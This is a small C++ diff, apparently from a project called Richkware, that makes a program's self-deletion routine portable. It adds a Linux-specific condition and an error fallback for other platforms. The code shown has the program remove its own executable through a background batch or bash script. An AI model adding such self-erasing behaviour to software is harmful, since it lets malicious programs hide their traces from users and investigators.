@@ -5,7 +5,7 @@
 
 #ifdef _WIN32
 #include <windows.h>
-#else
+#elif defined(__linux__)
 #include <unistd.h>
 #include <fcntl.h>
 #include <sys/stat.h>
@@ -49,7 +49,7 @@ public:
         system(("start /b " + batch_file).c_str());
         exit(0);
 
-#else
+#elif defined(__linux__)
         // Linux self-deletion using rm command
         char exe_path[PATH_MAX];
         ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
@@ -70,6 +70,8 @@ public:
             system(("bash " + script_path + " &").c_str());
         }
         exit(0);
+#else
+        return core::RichkwareError{core::ErrorCode::SystemError, "Self-deletion not supported on this platform"};
 #endif
 
         return core::Result<void>{};
